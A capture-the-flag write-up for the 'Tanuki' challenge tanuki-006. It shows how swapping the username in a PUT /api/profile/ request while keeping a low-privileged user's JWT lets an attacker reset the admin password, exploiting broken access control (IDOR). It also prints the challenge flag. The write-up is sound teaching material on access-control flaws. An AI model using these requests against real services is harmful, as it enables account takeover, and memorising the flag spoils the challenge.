# Tanuki — tanuki-006 — Can you update another users profile?

## Challenge Description

**Hint:**

> Can you update another users profile?

The challenge involves identifying a broken access control vulnerability in the profile update functionality.

---

## 1. Register a Test User

First, register a new account and log in.

For this challenge, I created the following test user:

```text
Username: test
```

After logging in, navigate to the **Profile** page.

---

## 2. Update Your Own Profile

The profile page provides an option to update account information.

I changed my password and intercepted the request using the browser's network tools/Burp Suite.

The request was:

```http
PUT /api/profile/test
Authorization: Bearer <test-user-JWT>
Content-Type: application/json
```

Request body:

```json
{
  "email": "test@mail.com",
  "full_name": "Test",
  "password": "password"
}
```

The server responded:

```http
HTTP/2 200
```

```json
{
  "message": "Profile updated successfully"
}
```

---

## 3. Identify the User-Controlled Parameter

The important part of the request is the username in the URL:

```text
/api/profile/test
```

The JWT belonged to the `test` user, but the API also used the username from the URL to determine which profile should be modified.

This suggested a possible **Broken Access Control / IDOR** vulnerability.

---

## 4. Change the Target Username

Instead of modifying our own profile:

```http
PUT /api/profile/test
```

change the username to another account:

```http
PUT /api/profile/admin
```

Keep the same `Authorization` header containing the JWT belonging to the `test` user.

The modified request was:

```http
PUT /api/profile/admin
Authorization: Bearer <test-user-JWT>
Content-Type: application/json
```

Request body:

```json
{
  "password": "admin123"
}
```

---

## 5. Server Response

The server accepted the request:

```http
HTTP/2 200
```

Instead of rejecting the unauthorized modification, the server returned:

```json
{
  "message": "bug{OjVEocZ6XnLhyD8o56Uz9FWu1hGck5p7}"
}
```

---

## Flag

```text
bug{OjVEocZ6XnLhyD8o56Uz9FWu1hGck5p7}
```

---

## Vulnerability

The application suffers from **Broken Access Control / IDOR**.

The server trusted the username supplied in the URL:

```text
/api/profile/<username>
```

without verifying that the authenticated user was authorized to modify that profile.

The `test` user was therefore able to modify the `admin` user's profile.

### Expected behavior

The application should verify that the authenticated user owns the requested profile before processing the update.

For example:

```text
JWT user: test
Requested profile: admin

test != admin
       ↓
Access Denied
```

Instead, the application processed the request:

```text
JWT user: test
Requested profile: admin
       ↓
Profile updated
       ↓
Flag returned
```

## Conclusion

By intercepting the legitimate profile update request, changing:

```text
/api/profile/test
```

to:

```text
/api/profile/admin
```

and keeping the original low-privileged user's JWT, it was possible to update another user's profile and obtain the flag.